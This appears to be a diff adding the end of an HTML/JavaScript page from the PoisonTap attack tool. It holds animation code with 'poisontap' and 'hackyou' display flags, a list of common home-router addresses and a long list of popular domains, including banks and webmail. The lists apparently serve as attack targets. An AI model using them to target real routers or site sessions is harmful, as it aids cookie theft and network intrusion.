+        var sint = function()
+        {
+          if (init.ctx.globalAlpha != 0)
+            init.ctx.globalAlpha -= 0.01;
+          requestAnimationFrame(sint);
+        };
+      }
+
+    }, 1000/30);
+  };
+  timerIteration();
+
+
+  var motionSet = [
+  {
+    time : 500,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.staticFlag = "fontmap_poisontap";
+      //controll.staticFlag = "fontmap_solidcell";
+      staticTransformSeries(1000);
+    }
+  },
+  {
+    time : 3000,
+    func : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        instanceObject[i].uniqueFlag001 = true;
+      };
+    }
+  },
+  {
+    time : 1000,
+    func : function() {
+      controll.staticFlag = "freemap_disconnected";
+      staticTransformSeries(800);
+    }
+  },
+  /*
+     {
+     time : 2500,
+     func : function() {
+     for(var i=0; i<DEFIINE_instanceNum; i++) {
+     instanceObject[i].uniqueFlag001 = false;
+     };
+     controll.dynamicFlag = 0;
+     init.nodeStrokeFlag = false;
+     controll.staticFlag = "fontmap_hackyou";
+     staticTransformSeries(300);
+     }
+     },
+   */
+  {
+    time : 2500,
+    func : function() {
+      controll.staticFlag = "freemap_random";
+      staticTransformParallel(1000);
+    }
+  },
+  {
+    time : 1000,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.dynamicFlag = 3;
+    }
+  },
+
+  /*
+     {
+     time : 2000,
+     func : function() {
+     controll.staticFlag = "fontmap_solidcell";
+     staticTransformSeries(500);
+     }
+     },
+     {
+     time : 2000,
+     func : function() {
+     controll.staticFlag = "fontmap_solidcell";
+     staticTransformSeries(500);
+     }
+     },
+   */
+  //k
+  {
+    time : 2000,
+    func : function() {
+      controll.staticFlag = "freemap_random";
+      staticTransformSeries(800);
+    }
+  },
+  /*
+     {
+     time : 2500,
+     func : function() {
+     controll.staticFlag = "freemap_random";
+     staticTransformSeries(800);
+     }
+     },
+     {
+     time : 2000,
+     func : function() {
+     controll.staticFlag = "freemap_random";
+     staticTransformSeries(800);
+     }
+     },
+   */
+  {
+    time : 3000,
+    func : function() {
+      controll.staticFlag = "freemap_disconnected";
+      staticTransformSeries(500);
+    }
+  },
+  /*
+     {
+     time : 1500,
+     func : function() {
+     init.nodeStrokeFlag = false;
+     controll.dynamicFlag = 0;
+     controll.staticFlag = "fontmap_fullchara";
+     staticTransformParallel(1000);
+     }
+     },
+   */
+  {
+    time : 1500,
+    func : function() {
+      controll.dynamicFlag = 1;
+    }
+  },
+  {
+    time : 2000,
+    func : function() {
+      controll.dynamicFlag = 2;
+    }
+  },
+  {
+    time : 1500,
+    func : function() {
+      controll.dynamicFlag = 1;
+    }
+  },
+  {
+    time : 1500,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.dynamicFlag = 4;
+    }
+  },
+  /*
+     {
+     time : 2500,
+     func : function() {
+     init.nodeStrokeFlag = false;
+     controll.dynamicFlag = 0;
+     controll.staticFlag = "fontmap_fullchara";
+     staticTransformParallel(1000);
+     }
+     },
+   */
+  {
+    time : 2000,
+    func : function() {
+      init.nodeStrokeFlag = true;
+      controll.dynamicFlag = 0;
+      controll.staticFlag = "freemap_disconnected";
+      staticTransformSeries(800);
+    }
+  }
+  /*
+     {
+     time : 10000,
+     func : function() {
+     }
+     }
+   */
+  ];
+
+  var motionIndex = 0;
+  var motionChanger = function() {
+    setTimeout(function() {
+      motionSet[motionIndex].func();
+      motionIndex++;
+      if(motionSet.length == motionIndex) motionIndex = 0;
+      motionChanger();
+    }, motionSet[motionIndex].time);
+  };
+  motionChanger();
+
+
+}
+
+function getRouters()
+{
+  return [
+    "10.0.0.1",
+    "10.0.0.138",
+    "10.0.0.2",
+    "10.0.1.1",
+    "10.1.1.1",
+    "10.1.10.1",
+    "10.10.1.1",
+    "10.90.90.90",
+    "192.168.0.1",
+    "192.168.0.10",
+    "192.168.0.100",
+    "192.168.0.101",
+    "192.168.0.227",
+    "192.168.0.254",
+    "192.168.0.3",
+    "192.168.0.30",
+    "192.168.0.50",
+    "192.168.1.1",
+    "192.168.1.10",
+    "192.168.1.100",
+    "192.168.1.200",
+    "192.168.1.210",
+    "192.168.1.254",
+    "192.168.1.99",
+    "192.168.10.1",
+    "192.168.10.10",
+    "192.168.10.100",
+    "192.168.10.50",
+    "192.168.100.1",
+    "192.168.100.100",
+    "192.168.102.1",
+    "192.168.11.1",
+    "192.168.123.254",
+    "192.168.15.1",
+    "192.168.16.1",
+    "192.168.168.168",
+    "192.168.2.1",
+    "192.168.2.254",
+    "192.168.20.1",
+    "192.168.223.100",
+    "192.168.251.1",
+    "192.168.254.254",
+    "192.168.3.1",
+    "192.168.30.1",
+    "192.168.4.1",
+    "192.168.50.1",
+    "192.168.55.1",
+    "192.168.62.1",
+    "192.168.8.1",
+    "200.200.200.5"
+  ];
+}
+
+function getDoms()
+{
+  return [
+    "google.com",
+    "youtube.com",
+    "facebook.com",
+    "baidu.com",
+    "yahoo.com",
+    "amazon.com",
+    "wikipedia.org",
+    "qq.com",
+    "google.co.in",
+    "twitter.com",
+    "live.com",
+    "taobao.com",
+    "msn.com",
+    "sina.com.cn",
+    "yahoo.co.jp",
+    "google.co.jp",
+    "linkedin.com",
+    "weibo.com",
+    "bing.com",
+    "yandex.ru",
+    "vk.com",
+    "hao123.com",
+    "instagram.com",
+    "ebay.com",
+    "google.de",
+    "amazon.co.jp",
+    "360.cn",
+    "tmall.com",
+    "mail.ru",
+    "pinterest.com",
+    "google.co.uk",
+    "google.ru",
+    "reddit.com",
+    "netflix.com",
+    "t.co",
+    "google.com.br",
+    "sohu.com",
+    "google.fr",
+    "paypal.com",
+    "microsoft.com",
+    "wordpress.com",
+    "google.it",
+    "google.es",
+    "blogspot.com",
+    "tumblr.com",
+    "onclickads.net",
+    "apple.com",
+    "imgur.com",
+    "ok.ru",
+    "gmw.cn",
+    "xvideos.com",
+    "stackoverflow.com",
+    "aliexpress.com",
+    "google.com.hk",
+    "imdb.com",
+    "google.com.mx",
+    "fc2.com",
+    "ask.com",
+    "amazon.de",
+    "google.com.tr",
+    "google.ca",
+    "rakuten.co.jp",
+    "tianya.cn",
+    "alibaba.com",
+    "office.com",
+    "diply.com",
+    "pornhub.com",
+    "google.co.id",
+    "soso.com",
+    "github.com",
+    "craigslist.org",
+    "chinadaily.com.cn",
+    "go.com",
+    "xinhuanet.com",
+    "pixnet.net",
+    "nicovideo.jp",
+    "amazon.co.uk",
+    "amazon.in",
+    "bongacams.com",
+    "outbrain.com",
+    "cnn.com",
+    "cntv.cn",
+    "googleusercontent.com",
+    "blogger.com",
+    "kat.cr",
+    "naver.com",
+    "google.pl",
+    "google.com.au",
+    "jd.com",
+    "coccoc.com",
+    "dropbox.com",
+    "china.com",
+    "xhamster.com",
+    "360.com",
+    "adobe.com",
+    "haosou.com",
+    "sogou.com",
+    "microsoftonline.com",
+    "nytimes.com",
+    "whatsapp.com",
+    "chase.com",
+    "flipkart.com",
+    "alipay.com",
+    "163.com",
+    "booking.com",
+    "google.com.eg",
+    "bbc.co.uk",
+    "espn.go.com",
+    "adnetworkperformance.com",
+    "amazon.cn",
+    "google.com.pk",
+    "google.com.sa",
+    "youth.cn",
+    "wikia.com",
+    "youku.com",
+    "google.co.th",
+    "indiatimes.com",
+    "china.com.cn",
+    "livedoor.jp",
+    "google.com.ar",
+    "google.com.tw",
+    "ebay.co.uk",
+    "ebay.de",
+    "google.co.kr",
+    "wittyfeed.com",
+    "dailymotion.com",
+    "quora.com",
+    "cnzz.com",
+    "bankofamerica.com",
+    "adf.ly",
+    "bbc.com",
+    "amazonaws.com",
+    "twitch.tv",
+    "google.nl",
+    "xnxx.com",
+    "popads.net",
+    "dailymail.co.uk",
+    "buzzfeed.com",
+    "huffingtonpost.com",
+    "tudou.com",
+    "ettoday.net",
+    "wellsfargo.com",
+    "zillow.com",
+    "globo.com",
+    "so.com",
+    "etsy.com",
+    "dmm.co.jp",
+    "ameblo.jp",
+    "detail.tmall.com",
+    "walmart.com",
+    "uol.com.br",
+    "indeed.com",
+    "yelp.com",
+    "aol.com",
+    "avito.ru",
+    "blogspot.in",
+    "zhihu.com",
+    "google.gr",
+    "soundcloud.com",
+    "detik.com",
+    "txxx.com",
+    "slideshare.net",
+    "cnet.com",
+    "google.co.za",
+    "weather.com",
+    "directrev.com",
+    "google.com.ua",
+    "bilibili.com",
+    "theguardian.com",
+    "espncricinfo.com",
+    "theladbible.com",
+    "kakaku.com",
+    "vice.com",
+    "goo.ne.jp",
+    "naver.jp",
+    "taboola.com",
+    "flickr.com",
+    "salesforce.com",
+    "stackexchange.com",
+    "washingtonpost.com",
+    "gfycat.com",
+    "mediafire.com",
+    "amazon.it",
+    "foxnews.com",
+    "google.com.ng",
+    "taringa.net",
+    "tripadvisor.com",
+    "google.cn",
+    "redtube.com",
+    "uptodown.com",
+    "amazon.fr",
+    "target.com",
+    "leboncoin.fr",
+    "forbes.com",
+    "daum.net",
+    "godaddy.com",
+    "feedly.com",
+    "google.com.co",
+    "imzog.com",
+    "softonic.com",
+    "liveadexchanger.com",
+    "google.com.sg",
+    "bp.blogspot.com",
+    "tradeadexchange.com",
+    "51.la",
+    "snapdeal.com",
+    "ikea.com",
+    "hclips.com",
+    "orange.fr",
+    "web.de",
+    "youm7.com",
+    "vimeo.com",
+    "github.io",
+    "onlinesbi.com",
+    "ifeng.com",
+    "babytree.com",
+    "nih.gov",
+    "google.ro",
+    "youporn.com",
+    "comcast.net",
+    "9gag.com",
+    "zol.com.cn",
+    "force.com",
+    "steamcommunity.com",
+    "americanexpress.com",
+    "udn.com",
+    "google.be",
+    "tribunnews.com",
+    "pixiv.net",
+    "gmx.net",
+    "intuit.com",
+    "torrentz.eu",
+    "secureserver.net",
+    "rdsa2012.com",
+    "thepiratebay.se",
+    "reimageplus.com",
+    "mozilla.org",
+    "steampowered.com",
+    "about.com",
+    "wikihow.com",
+    "allegro.pl",
+    "wix.com",
+    "google.com.ph",
+    "livejournal.com",
+    "1688.com",
+    "homedepot.com",
+    "gamer.com.tw",
+    "hdfcbank.com",
+    "akamaihd.net",
+    "xuite.net",
+    "capitalone.com",
+    "skype.com",
+    "bestbuy.com",
+    "usps.com",
+    "putlocker.is",
+    "w3schools.com",
+    "shutterstock.com",
+    "xywy.com",
+    "iqiyi.com",
+    "groupon.com",
+    "ruten.com.tw",
+    "google.at",
+    "google.co.ve",
+    "deviantart.com",
+    "hulu.com",
+    "bitauto.com",
+    "mega.nz",
+    "xfinity.com",
+    "onet.pl",
+    "google.com.pe",
+    "slickdeals.net",
+    "icicibank.com",
+    "upornia.com",
+    "t-online.de",
+    "files.wordpress.com",
+    "speedtest.net",
+    "huanqiu.com",
+    "seznam.cz",
+    "nametests.com",
+    "youtube-mp3.org",
+    "pandora.com",
+    "bet365.com",
+    "blastingnews.com",
+    "archive.org",
+    "caijing.com.cn",
+    "businessinsider.com",
+    "blog.jp",
+    "eksisozluk.com",
+    "amazon.es",
+    "weebly.com",
+    "google.se",
+    "wikimedia.org",
+    "ups.com",
+    "csdn.net",
+    "rambler.ru",
+    "google.pt",
+    "google.ae",
+    "ebay-kleinanzeigen.de",
+    "goodreads.com",
+    "spotify.com",
+    "webtretho.com",
+    "wordpress.org",
+    "1905.com",
+    "wp.pl",
+    "google.ch",
+    "doorblog.jp",
+    "mama.cn",
+    "google.dz",
+    "usatoday.com",
+    "samsung.com",
+    "ndtv.com",
+    "popcash.net",
+    "onedio.com",
+    "cnnic.cn",
+    "liputan6.com",
+    "39.net",
+    "terraclicks.com",
+    "siteadvisor.com",
+    "telegraph.co.uk",
+    "fedex.com",
+    "hp.com",
+    "rediff.com",
+    "wordreference.com",
+    "ltn.com.tw",
+    "webmd.com",
+    "51yes.com",
+    "sberbank.ru",
+    "abs-cbn.com",
+    "accuweather.com",
+    "kaskus.co.id",
+    "2ch.net",
+    "google.co.il",
+    "varzesh3.com",
+    "twimg.com",
+    "milliyet.com.tr",
+    "doubleclick.net",
+    "att.com",
+    "irctc.co.in",
+    "fbcdn.net",
+    "hurriyet.com.tr",
+    "sourceforge.net",
+    "icloud.com",
+    "loading-delivery2.com",
+    "sabah.com.tr",
+    "thesaurus.com",
+    "google.hu",
+    "themeforest.net",
+    "google.cl",
+    "gizmodo.com",
+    "kompas.com",
+    "dell.com",
+    "ontests.me",
+    "paytm.com",
+    "enet.com.cn",
+    "eastday.com",
+    "verizonwireless.com",
+    "kapanlagi.com",
+    "mailchimp.com",
+    "google.cz",
+    "bloomberg.com",
+    "mercadolivre.com.br",
+    "chaturbate.com",
+    "mashable.com",
+    "zendesk.com",
+    "addthis.com",
+    "google.ie",
+    "digikala.com",
+    "badoo.com",
+    "gsmarena.com",
+    "trello.com",
+    "livejasmin.com",
+    "sahibinden.com",
+    "impress.co.jp",
+    "urdupoint.com",
+    "bukalapak.com",
+    "life.tw",
+    "merdeka.com",
+    "slack.com",
+    "media.tumblr.com",
+    "cricbuzz.com",
+    "chaoshi.tmall.com",
+    "mystart.com",
+    "adidas.tmall.com",
+    "hotstar.com",
+    "watsons.tmall.com",
+    "medium.com",
+    "oracle.com",
+    "kinogo.co",
+    "jabong.com",
+    "ign.com",
+    "wsj.com",
+    "douyutv.com",
+    "buzzlie.com",
+    "avg.com",
+    "yandex.ua",
+    "macys.com",
+    "blogfa.com",
+    "pinimg.com",
+    "savefrom.net",
+    "ilyke.co",
+    "tube8.com",
+    "citi.com",
+    "lowes.com",
+    "doublepimp.com",
+    "livedoor.biz",
+    "blackboard.com",
+    "nownews.com",
+    "reuters.com",
+    "naukri.com",
+    "eyny.com",
+    "olx.pl",
+    "nyaa.se",
+    "roblox.com",
+    "airbnb.com",
+    "baike.com",
+    "dmm.com",
+    "taleo.net",
+    "cbssports.com",
+    "ebay.in",
+    "expedia.com",
+    "libero.it",
+    "kohls.com",
+    "evernote.com",
+    "adplxmd.com",
+    "kinopoisk.ru",
+    "bild.de",
+    "sharepoint.com",
+    "spiegel.de",
+    "kwejk.pl",
+    "irs.gov",
+    "livedoor.com",
+    "google.fi",
+    "thesportbible.com",
+    "hootsuite.com",
+    "engadget.com",
+    "amazon.ca",
+    "bhaskar.com",
+    "friv.com",
+    "playstation.com",
+    "giphy.com",
+    "haber7.com",
+    "likes.com",
+    "mi.com",
+    "ameba.jp",
+    "scribd.com",
+    "google.no",
+    "ci123.com",
+    "shopify.com",
+    "ancestry.com",
+    "tistory.com",
+    "tokopedia.com",
+    "google.sk",
+    "hm.com",
+    "mobile.de",
+    "box.com",
+    "17ok.com",
+    "infusionsoft.com",
+    "battle.net",
+    "tabelog.com",
+    "streamcloud.eu",
+    "newegg.com",
+    "patch.com",
+    "aparat.com",
+    "allrecipes.com",
+    "instructure.com",
+    "nike.com",
+    "ebay.it",
+    "realtor.com",
+    "rbc.ru",
+    "youdao.com",
+    "google.dk",
+    "thefreedictionary.com",
+    "4shared.com",
+    "quikr.com",
+    "conservativetribune.com",
+    "hespress.com",
+    "lifehacker.com",
+    "billdesk.com",
+    "fidelity.com",
+    "nbcnews.com",
+    "gearbest.com",
+    "messenger.com",
+    "discovercard.com",
+    "repubblica.it",
+    "free.fr",
+    "elpais.com",
+    "cnblogs.com",
+    "cloudfront.net",
+    "yallakora.com",
+    "npr.org",
+    "surveymonkey.com",
+    "asos.com",
+    "gap.com",
+    "stumbleupon.com",
+    "freepik.com",
+    "theverge.com",
+    "wunderground.com",
+    "list-manage.com",
+    "japanpost.jp",
+    "nifty.com",
+    ];
+}
+
+</script>
+</body>
+</html>
+*/
